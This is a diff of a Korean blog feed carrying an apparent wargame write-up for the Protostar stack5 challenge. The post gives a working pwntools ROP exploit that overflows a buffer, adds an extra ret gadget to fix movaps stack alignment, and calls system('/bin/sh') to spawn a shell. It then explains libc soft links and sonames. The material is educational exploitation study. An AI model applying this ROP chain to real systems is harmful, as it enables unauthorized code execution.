+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x48&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gadget_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;gdb&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attach&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;nb&quot;&gt;raw_input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gdb.attach(process({program_name}))&lt;/code&gt;를 이용해 스크립트에서 돌리는 프로그램에 gdb를 붙이도록 했고, gdb를 붙인 프로그램이 미처 반응하기도 전에 실행되고 끝나버리는 상황을 방지하기 위해 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;raw_input(”1”)&lt;/code&gt; 코드를 삽입했다. 위 스크립트를 실행하면 gdb 창이 뜨는데, 그때 브레이크 포인트를 설정하고 원래 터미널 창에 1을 입력한 후 gdb 창에서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c&lt;/code&gt; 를 누르면 디버깅을 할 수 있다.&lt;/p&gt;
+
+&lt;p&gt;브레이크 포인트 설정 시 콜스택을 잘 확인해야 한다. 이미 실행되었던 인스트럭션에 브레이크 포인트를 설정하는 바보짓은 절대 엄금이다! &lt;em&gt;그렇다. 내가 바로 그 바보다! 안녕하세요 반갑습니다 바보 1입니다&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt; 함수는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;do_system&lt;/code&gt; 함수를 콜하고, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;do_system&lt;/code&gt; 함수는 거의 끄트머리에서 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execve&lt;/code&gt; 함수를 콜하면서 인자를 넘겨주는 형식이다. 즉, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;do_system&lt;/code&gt; 함수 내부로 들어갔을 때 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execve&lt;/code&gt; 를 콜하기도 전에 SEGFAULT가 나는 이유를 알아내는 것이 현재 디버깅의 목적이다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%2014.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;c&lt;/code&gt;를 누르고 보면 위 부분에서 rip가 freezed 된 것이 보인다.&lt;/p&gt;
+
+&lt;p&gt;대관절 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;movaps&lt;/code&gt; 가 뭐냐 싶다.  검색해본 결과, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;movaps&lt;/code&gt; 는 64 비트 프로그램의 Calling convention을 지켜주고자 도입된 인스트럭션으로, 스택 주소가 16의 배수로 딱딱 떨어지게 데이터가 담겨있는 게 아니면 앞으로의 함수 콜에 심각한 문제가 생길 것을 우려해 프로그램을 멈추게 만드는 인스트럭션이다.&lt;/p&gt;
+
+&lt;p&gt;지금 문제가 된 인스트럭션을 보면, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;movaps xmmword ptr [rsp + 0x40], xmm0&lt;/code&gt; 이라고 되어 있는데, xmm0라는 레지스터는 SIMD 연산에 사용되는 전용 레지스터인데, SIMD(Single Instruction Multi Data)라는 이름에서도 알 수 있듯 한 레지스터에 4개의 데이터를 한꺼번에 집어넣을 수 있는 레지스터이다. 지금은 중요하지 않으니 그냥 넘어가자. 중요한 것은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;xmmword ptr [rsp + 0x40]&lt;/code&gt; 이다. 현재 보이는 컨텍스트의 아랫부분에 표현된 스택을 확인하면, rsp의 위치는 끝이 8로 끝나기 때문에 8의 배수이지만 16의 배수는 아니다. 여기에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x40&lt;/code&gt; 을 더한 스택의 위치는 역시 8의 배수이지만 16의 배수는 아니다. 즉, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;movaps&lt;/code&gt; 인스트럭션의 종료 조건에 딱 들어맞는 상황이다.&lt;/p&gt;
+
+&lt;p&gt;이런 상황은 사실 ROP 공격을 하지 않았다면 발생하지 않았을 상황이다. 그리고 ROP 공격을 할 때 가장 자주 맞닥뜨리는 pitfall 이기도 하다. 조금 더 자세한 설명은 &lt;a href=&quot;https://ropemporium.com/guide.html&quot;&gt;이쪽을 참고하자.&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;말이 거창했는데, 해결법은 간단하다. 내가 rsp 주소를 마음대로 바꾸다가 rsp 주소가 16의 배수가 아닌 8의 배수가 되도록 만들어 놨으니, rsp가 한 칸(8 bytes)을 더 내려가든 올라가든 하도록 하면 된다. 이 때 딱히 페이로드 구조를 크게 바꾸지 않고 rsp가 한 칸(8 bytes) 더 이동하도록 하는 제일 쉬운 방법은 ret를 처음에 하나 끼워넣는 것이다.&lt;/p&gt;
+
+&lt;p&gt;즉 페이로드는 아래와 같은 형태가 된다.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;offset bytes + Gadget1 address(ret;) + Gadget2 address(pop rdi;ret;) + parameter address + Library function address
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;ret add에 있는 인스트럭션의 주소로 rip를 옮겨놓으니 또 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ret&lt;/code&gt;을 하래서 rsp가 가리키는 주소에 있는 주소값을 rip에 넣어주니 이번엔 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pop rdi;ret;&lt;/code&gt;가 기다리고 있는 형식이다.&lt;/p&gt;
+
+&lt;p&gt;위와 같은 페이로드를 보내기 위해 스크립트를 아래와 같이 변형했다.&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ELF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;gadget&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ROP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x7ffff79e2000&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;extra_ret_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find_gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;ret&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;gadget_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find_gadget&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;pop rdi&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;ret&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;system_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;symbols&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;system&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;string_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;search&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/bin/sh&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;extra_ret_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;extra_ret_offset&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;gadget_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gadget_offset&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;system_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_offset&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;string_address&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string_offset&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;./stack5_64&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;sa&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;A&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x48&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;extra_ret_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gadget_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c1&quot;&gt;# gdb.attach(p)
+&lt;/span&gt;
+&lt;span class=&quot;c1&quot;&gt;# raw_input(&quot;1&quot;)
+&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;스크립트 실행 결과 아래와 같이 쉘을 딸 수 있었다.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%2015.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h1 id=&quot;3-삽질이-남긴-지식&quot;&gt;3. 삽질이 남긴 지식&lt;/h1&gt;
+
+&lt;h2 id=&quot;31-리눅스에서-프로그램-컴파일-시-refer되는-공유-라이브러리와-그-호출-과정&quot;&gt;3.1. 리눅스에서 프로그램 컴파일 시 refer되는 공유 라이브러리와 그 호출 과정&lt;/h2&gt;
+
+&lt;p&gt;먼저 pwndbg에서 vmmap을 이용해 어떤 라이브러리가 링킹되어 있는지 보자.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%2016.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[libc-2.27.so](http://libc-2.27.so)&lt;/code&gt; 파일과 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[ld-2.27.so](http://ld-2.27.so)&lt;/code&gt; 파일이 링킹되어 있는 게 보인다. 엥? 그런데 이상하다. 분명히 우리가 ldd, 즉 libc database 커맨드로 확인했을 때 사용된 라이브러리는 아래와 같았다.&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%204.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;아니 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc.so.6&lt;/code&gt; 이랑 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ld-linux.so.2&lt;/code&gt; 썼다며? 그런데 왜 정작 사용된 건 다른 거야??&lt;/p&gt;
 
-&lt;h3 id=&quot;file-link&quot;&gt;File Link&lt;/h3&gt;
+&lt;h3 id=&quot;311-file-link&quot;&gt;3.1.1. File Link&lt;/h3&gt;
 
 &lt;p&gt;이에 관해서는 리눅스의 soft link와 linker의 동적 라이브러리 호출에 대해 안다면 답을 알 수 있다.&lt;/p&gt;
 
@@ -372,19 +570,19 @@
   &lt;li&gt;
     &lt;p&gt;소프트 링크는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ln -s {original file} {linked file}&lt;/code&gt; 명령어로 생성한다. 이 경우 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ls -li&lt;/code&gt; 명령어로 inode와 파일 정보를 확인한다면 원본 파일과 링크된 파일의 inode 번호가 다르며, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-&amp;gt;&lt;/code&gt; 기호로 링크가 표시되어 있음을 확인할 수 있다. 이로 인해 원본 파일의 위치가 바뀌면 링크된 파일을 실행했을 때 링크가 원본 파일을 찾지 못한다. 아래 사진은 소프트 링크를 확인했을 때의 사진이다.&lt;/p&gt;
 
-    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%2011.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+    &lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%2017.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
 
-    &lt;p&gt;가장 첫 번째에 보이는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc-2.27.so&lt;/code&gt; 파일의 inode num은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;6816882&lt;/code&gt; 인데, 해당 파일에 소프트 링크가 걸려 있는 가장 마지막의 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc.so.6&lt;/code&gt; 파일의 inode num은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;6816904&lt;/code&gt; 로 서로 다르다는 것을 확인할 수 있다.&lt;/p&gt;
+    &lt;p&gt;가장 첫 번째에 보이는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[libc-2.27.so](http://libc-2.27.so)&lt;/code&gt; 파일의 inode num은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;6816882&lt;/code&gt; 인데, 해당 파일에 소프트 링크가 걸려 있는 가장 마지막의 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc.so.6&lt;/code&gt; 파일의 inode num은 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;6816904&lt;/code&gt; 로 서로 다르다는 것을 확인할 수 있다.&lt;/p&gt;
   &lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;좋아, 그렇다면 파일 실행 시 &lt;strong&gt;공유 라이브러리&lt;/strong&gt;로는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc.so.6&lt;/code&gt; 을 썼기 때문에 소프트 링크의 오리지널 파일인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc-2.27.so&lt;/code&gt; 가 사용됐고 &lt;strong&gt;Dynamic Loader&lt;/strong&gt;로는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ld-linux.so.2&lt;/code&gt; 를 썼기 때문에 링크가 걸린 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ld-2.27.so&lt;/code&gt; 가 사용됐다고 치자. (아래 사진 참고)&lt;/p&gt;
+&lt;p&gt;좋아, 그렇다면 파일 실행 시 &lt;strong&gt;공유 라이브러리&lt;/strong&gt;로는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc.so.6&lt;/code&gt; 을 썼기 때문에 소프트 링크의 오리지널 파일인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[libc-2.27.so](http://libc-2.27.so)&lt;/code&gt; 가 사용됐고 &lt;strong&gt;Dynamic Loader&lt;/strong&gt;로는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ld-linux.so.2&lt;/code&gt; 를 썼기 때문에 링크가 걸린 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[ld-2.27.so](http://ld-2.27.so)&lt;/code&gt; 가 사용됐다고 치자. (아래 사진 참고)&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%2012.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/img/posts/protostar5/Untitled%2018.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;그런데 또 궁금한 게 생긴다. so 파일이 뭔지는 알겠는데… &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;so.2&lt;/code&gt;와 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;so.6&lt;/code&gt;은 대체 무슨 뜻이야?&lt;/p&gt;
 
-&lt;h3 id=&quot;gcc를-이용한-c-언어-컴파일-시-파일-실행-시의-행위&quot;&gt;GCC를 이용한 C 언어 컴파일 시, 파일 실행 시의 행위&lt;/h3&gt;
+&lt;h3 id=&quot;312-gcc를-이용한-c-언어-컴파일-시-파일-실행-시의-행위&quot;&gt;3.1.2. GCC를 이용한 C 언어 컴파일 시, 파일 실행 시의 행위&lt;/h3&gt;
 
 &lt;p&gt;결론적으로 말하자면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.so&lt;/code&gt; 파일은 해당 라이브러리의 대표 호칭 격인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Linker name&lt;/code&gt;이고,  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.so.2&lt;/code&gt; 등 뒤에 숫자가 붙은 파일은 해당 라이브러리의 하위 격인 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;soname&lt;/code&gt; 이다.&lt;/p&gt;
 
@@ -403,14 +601,15 @@
   &lt;/li&gt;
 &lt;/ul&gt;
 
-&lt;p&gt;아무튼, 앞서 잠깐 언급했던 파일 실행 시의 행위를 이제 알아낸 정보를 이용해 더 구체화해 보자. 앞서 알아보았듯 해당 파일에게 지정된 Dynamic Loader는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ld-linux.so.2&lt;/code&gt; 인데, 심볼릭 링크 정책으로 인해 실제로는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ld-2.27.so&lt;/code&gt; 가 사용된다. 파일 실행 시 트리거된 Dynamic Loader는 soname을 이용해 어떤 라이브러리를 사용할지 찾아낸다.&lt;/p&gt;
+&lt;p&gt;아무튼, 앞서 잠깐 언급했던 파일 실행 시의 행위를 이제 알아낸 정보를 이용해 더 구체화해 보자. 앞서 알아보았듯 해당 파일에게 지정된 Dynamic Loader는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[ld-](http://ld-2.27.so)linux.so.2&lt;/code&gt; 인데, 심볼릭 링크 정책으로 인해 실제로는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[ld-2.27.so](http://ld-2.27.so)&lt;/code&gt; 가 사용된다. 파일 실행 시 트리거된 Dynamic Loader는 soname을 이용해 어떤 라이브러리를 사용할지 찾아낸다.&lt;/p&gt;
 
-&lt;p&gt;여기에서 soname을 가진 라이브러리는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc.so.6&lt;/code&gt;이기 때문에 Dynamic Loader는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc.so.6&lt;/code&gt; 을 실행시킴으로써 메모리에 적재하려 한다. 그런데, 심볼릭 링크 정책으로 인해 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc-2.27.so&lt;/code&gt; 가 실행되며 메모리에 적재된다. 이로 인해 실행 상태인 프로그램에 사용된 라이브러리를 사용하면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc.so.6&lt;/code&gt; 으로 뜨지 않는다.&lt;/p&gt;
+&lt;p&gt;여기에서 soname을 가진 라이브러리는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc.so.6&lt;/code&gt;이기 때문에 Dynamic Loader는 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc.so.6&lt;/code&gt; 을 실행시킴으로써 메모리에 적재하려 한다. 그런데, 심볼릭 링크 정책으로 인해 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[libc-2.27.so](http://libc-2.27.so)&lt;/code&gt; 가 실행되며 메모리에 적재된다. 이로 인해 실행 상태인 프로그램에 사용된 라이브러리를 사용하면 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;libc.so.6&lt;/code&gt; 으로 뜨지 않는다.&lt;/p&gt;
 
 &lt;p&gt;마지막 의문이 하나 생긴다. 왜 굳이? 왜 굳이 이렇게 심볼릭 링크를 써서 돌아 돌아 가는 것일까? 그 이유는 라이브러리 연결의 호환성을 좋게 하기 위해서이다. 통상적으로 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;{library_name.so.1.5}-&amp;gt;{library_name.so}&lt;/code&gt; 의 구도로 링크가 걸리는데, 이는 개발 환경에 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.so.1.5&lt;/code&gt; 버전의 라이브러리뿐 아니라 다른 버전의 라이브러리도 존재할 수 있기 때문에 어떤 버전(어떤 soname)을 사용하든 안정적으로 필요한 Linker name을 가진 라이브러리와 연결해주기 위해서 생겨난 방식이다.&lt;/p&gt;
 
 &lt;hr /&gt;
-&lt;h1 id=&quot;참고문헌&quot;&gt;참고문헌&lt;/h1&gt;
+
+&lt;h1 id=&quot;4-참고문헌&quot;&gt;4. 참고문헌&lt;/h1&gt;
 
 &lt;ul&gt;
   &lt;li&gt;x64dbg 디버거를 활용한 리버싱과 시스템 해킹의 원리(김민수 저, 210p RTL)&lt;/li&gt;
@@ -1118,7 +1317,7 @@
   &lt;/tbody&gt;
 &lt;/table&gt;
 </description>
-        <pubDate>Fri, 12 Aug 2022 20:31:23 +0900</pubDate>
